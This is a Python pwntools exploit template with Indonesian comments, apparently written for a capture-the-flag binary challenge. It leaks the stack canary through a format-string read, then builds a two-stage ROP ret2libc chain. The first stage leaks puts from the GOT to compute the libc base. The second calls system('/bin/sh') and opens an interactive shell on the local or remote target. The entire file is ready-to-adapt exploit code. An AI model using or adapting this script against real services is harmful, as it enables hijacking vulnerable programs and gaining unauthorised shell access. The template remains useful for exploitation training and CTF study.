#!/usr/bin/env python3
# Bypass canary (leak dulu) lalu ROP ret2libc. Sesuaikan offset & cara leak canary.
from pwn import *

BIN = './chall'
context.binary = exe = ELF(BIN, checksec=False)
libc = ELF('./libc.so.6', checksec=False)
HOST, PORT = 'host', 1337
PROMPT = b'> '
OFF_TO_CANARY = 40      # jarak buffer -> canary
# setelah canary ada 8 byte saved RBP, lalu RIP

def start():
    return remote(HOST, PORT) if args.REMOTE else process(BIN)

io = start()
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# ---- leak canary (contoh via format string / fungsi print yang over-read) ----
# ganti sesuai soal; canary diakhiri byte 00
io.sendlineafter(PROMPT, b'%15$p')          # contoh fmtstr leak
canary = int(io.recvline().strip(), 16)
log.success(f'canary = {hex(canary)}')

# ---- TAHAP 1: leak libc (puts(puts@got)) ----
payload  = b'A'*OFF_TO_CANARY + p64(canary) + p64(0)      # canary + saved rbp
payload += p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
io.sendlineafter(PROMPT, payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success(f'libc = {hex(libc.address)}')

# ---- TAHAP 2: system("/bin/sh") ----
binsh = next(libc.search(b'/bin/sh\x00'))
payload  = b'A'*OFF_TO_CANARY + p64(canary) + p64(0)
payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.sym['system'])
io.sendlineafter(PROMPT, payload)
io.interactive()
